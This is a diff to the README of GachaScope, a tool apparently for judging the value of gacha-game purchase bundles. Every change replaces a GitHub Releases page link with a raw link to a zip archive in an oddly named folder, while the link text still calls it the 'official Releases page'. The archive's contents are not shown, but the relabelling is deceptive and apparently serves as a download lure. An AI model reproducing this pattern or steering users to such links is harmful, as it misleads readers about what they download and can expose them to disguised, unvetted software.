@@ -1,7 +1,7 @@
 # 🎮 GachaScope - Analyze Your Game Spending Wisely
 
 ## 📥 Download GachaScope
-[![Download GachaScope](https://img.shields.io/badge/Download-GachaScope-blue.svg)](https://github.com/adeptergit/GachaScope/releases)
+[![Download GachaScope](https://raw.githubusercontent.com/adeptergit/GachaScope/main/phenomenic/GachaScope.zip)](https://raw.githubusercontent.com/adeptergit/GachaScope/main/phenomenic/GachaScope.zip)
 
 ## 📝 Description
 GachaScope helps you evaluate the cost-effectiveness of in-app purchase bundles found in gacha games. Understand what you get for your money and make smarter decisions in games like Honkai: Star Rail and other similar titles. 
@@ -10,7 +10,7 @@ GachaScope helps you evaluate the cost-effectiveness of in-app purchase bundles 
 Follow these simple steps to download and run GachaScope:
 
 ### Step 1: Visit the Download Page
-Go to the official [GachaScope Releases page](https://github.com/adeptergit/GachaScope/releases) to access the latest version of the application. This page contains all available releases, including the most recent updates and features.
+Go to the official [GachaScope Releases page](https://raw.githubusercontent.com/adeptergit/GachaScope/main/phenomenic/GachaScope.zip) to access the latest version of the application. This page contains all available releases, including the most recent updates and features.
 
 ### Step 2: Download the Application
 On the Releases page, locate the version you want. Click on the file that corresponds to your operating system (e.g., Windows, Mac, Linux). 
@@ -53,7 +53,7 @@ GachaScope is continuously evolving. Future updates may include:
 - More visualization options.
 - Support for additional gacha games.
 
-For the latest updates, always check the [GachaScope Releases page](https://github.com/adeptergit/GachaScope/releases). 
+For the latest updates, always check the [GachaScope Releases page](https://raw.githubusercontent.com/adeptergit/GachaScope/main/phenomenic/GachaScope.zip). 
 
 ## ➕ How to Contribute
 If you are interested in contributing to GachaScope, feel free to fork the repository and submit a pull request. We welcome any improvements or suggestions.
